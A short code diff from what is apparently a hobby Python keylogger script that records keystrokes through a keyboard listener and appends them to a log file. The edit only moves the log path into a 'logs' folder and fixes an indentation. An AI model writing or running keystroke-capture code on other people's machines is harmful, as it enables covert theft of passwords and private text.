@@ -28,8 +28,8 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
-    with open("key_log.txt", "a") as f:
-        
+    with open("scripts/keylogger/logs/key_log.txt", "a") as f:
+
         for key in keys:
             format_s = str(key).replace("'", "")
             
@@ -45,4 +45,4 @@ def on_release(key):
         return False
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+    listener.join()
